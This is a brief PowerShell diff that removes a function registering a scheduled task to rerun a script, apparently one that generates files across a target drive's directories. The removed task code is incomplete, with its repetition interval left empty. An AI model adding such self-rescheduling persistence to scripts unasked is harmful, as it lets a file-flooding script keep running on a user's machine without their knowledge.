@@ -71,14 +71,4 @@ $TargetList = Get-Directories($TargetDrive)
 Get-Directories($TargetList)
 New-Files($TargetNumber)
 
-# STEP 6
-# Create scheduled task to run this script at certain intervals.
-Function New-ScheduledTask() {
-  $TaskAction = New-ScheduledTaskAction -Execute 'C:\Users\kansa\Documents\Posh\Get-Fucked.ps1'
-  $TaskTrigger = New-ScheduledTaskTrigger -RepetitionInterval 
-  $TaskPrincipal = New-ScheduledTaskPrincipal "laptop-qfud6pv4\kansa"
-  $TaskSetting = New-ScheduledTaskSettingsSet
-  $ScheduleTask = New-ScheduledTask -Action $TaskAction -Principal $TaskPrincipal -Trigger $TaskTrigger -Settings $TaskSetting
-  $RegisterTask = Register-ScheduledTask T1 -InputObject $ScheduleTask
-  return $RegisterTask
-}
+
